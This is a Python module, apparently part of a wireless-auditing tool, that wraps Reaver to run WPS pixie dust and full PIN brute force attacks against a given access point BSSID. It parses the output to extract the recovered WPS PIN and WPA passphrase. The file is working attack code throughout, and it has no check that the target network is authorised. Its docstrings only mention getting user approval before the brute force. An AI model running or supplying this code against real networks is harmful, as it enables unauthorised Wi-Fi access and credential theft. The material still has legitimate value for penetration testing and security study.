"""WPS attacks via Reaver — pixie dust and full PIN brute force.

Pixie dust (``reaver -K 1``) is fast (~30s) and should be tried first.
Full PIN brute force can take hours and requires user approval.
"""

from __future__ import annotations

import asyncio
import logging
import shutil
from dataclasses import dataclass
from typing import Optional

logger = logging.getLogger(__name__)


@dataclass
class ReaverResult:
    """Outcome of a Reaver attack."""

    success: bool
    pin: str = ""
    password: str = ""
    error: str = ""


def is_available() -> bool:
    """Check if reaver is installed."""
    return shutil.which("reaver") is not None


async def pixie_dust(
    interface: str, bssid: str, channel: Optional[int] = None, timeout: int = 60,
) -> ReaverResult:
    """Run pixie dust attack (reaver -K 1). Fast — ~30s if vulnerable."""
    if not is_available():
        return ReaverResult(success=False, error="reaver not installed")

    cmd = ["sudo", "reaver", "-i", interface, "-b", bssid, "-K", "1", "-vv"]
    if channel:
        cmd.extend(["-c", str(channel)])

    return await _run_reaver(cmd, timeout)


async def full_brute(
    interface: str, bssid: str, channel: Optional[int] = None, timeout: int = 14400,
) -> ReaverResult:
    """Run full WPS PIN brute force. SLOW — hours per target.

    Default timeout is 4 hours. User approval should be obtained before calling.
    """
    if not is_available():
        return ReaverResult(success=False, error="reaver not installed")

    cmd = ["sudo", "reaver", "-i", interface, "-b", bssid, "-vv", "--no-nacks"]
    if channel:
        cmd.extend(["-c", str(channel)])

    return await _run_reaver(cmd, timeout)


async def _run_reaver(cmd: list, timeout: int) -> ReaverResult:
    """Execute reaver and parse output for PIN/password."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.terminate()
            stdout, _ = await proc.communicate()
            return ReaverResult(success=False, error="timeout")

        output = stdout.decode("utf-8", errors="replace")
        return _parse_reaver_output(output)

    except Exception as exc:
        return ReaverResult(success=False, error=str(exc))


def _parse_reaver_output(output: str) -> ReaverResult:
    """Extract PIN and password from reaver output."""
    pin = ""
    password = ""
    for line in output.splitlines():
        line = line.strip()
        if "WPS PIN:" in line:
            pin = line.split("WPS PIN:")[-1].strip().strip("'\"")
        elif "WPA PSK:" in line:
            password = line.split("WPA PSK:")[-1].strip().strip("'\"")

    if password:
        return ReaverResult(success=True, pin=pin, password=password)
    if pin:
        return ReaverResult(success=True, pin=pin)
    return ReaverResult(success=False, error="no PIN/password recovered")


__all__ = ["ReaverResult", "full_brute", "is_available", "pixie_dust"]
